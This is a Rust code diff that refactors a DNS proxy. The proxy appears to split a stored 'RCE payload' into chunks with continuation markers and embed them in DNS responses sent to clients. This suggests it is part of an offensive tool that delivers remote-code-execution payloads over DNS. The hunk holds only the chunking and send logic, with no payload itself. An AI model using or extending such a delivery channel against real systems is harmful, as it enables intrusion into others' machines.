@@ -194,24 +194,24 @@ impl DnsProxy {
             let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
                 sessions.lock().await;
             let current_session = current_sessions.get_mut(&s.ip).unwrap();
-            if let Some(ref mut rce_payload_buf) = &mut current_session.rce_payload_buffer {
-                let rce_payload_selected = current_session.rce_payload.clone().unwrap();
-                if !rce_payload_buf.is_empty() {
-                    let is_start = rce_payload_buf.len() == rce_payload_selected.len();
-                    let out_payload: Vec<u8> = rce_payload_buf
-                        .drain(0..payload_max_len.min(rce_payload_selected.len()))
+            if let Some(ref mut rce_payload) = &mut current_session.rce_payload {
+                if !rce_payload.buffer.is_empty() {
+                    let is_start = rce_payload.buffer.len() == rce_payload.length;
+                    let transmitted_payload: Vec<u8> = rce_payload
+                        .buffer
+                        .drain(0..payload_max_len.min(rce_payload.length))
                         .collect();
-                    debug!("PAYLOAD SZ={}", out_payload.len());
-                    let cbyte = if out_payload.len() == rce_payload_selected.len() {
+                    debug!("PAYLOAD SZ={}", transmitted_payload.len());
+                    let cbyte = if transmitted_payload.len() == rce_payload.length {
                         ContinuationByte::ResetEnd
-                    } else if rce_payload_buf.is_empty() {
+                    } else if rce_payload.buffer.is_empty() {
                         ContinuationByte::End
                     } else if is_start {
                         ContinuationByte::Reset
                     } else {
                         ContinuationByte::Continue
                     };
-                    let augmented_data = add_info(&mut data, &out_payload, cbyte).await?;
+                    let augmented_data = add_info(&mut data, &transmitted_payload, cbyte).await?;
                     let len = sock.send_to(&augmented_data, addr).await?;
                     debug!("{:?} bytes sent", len);
                 }
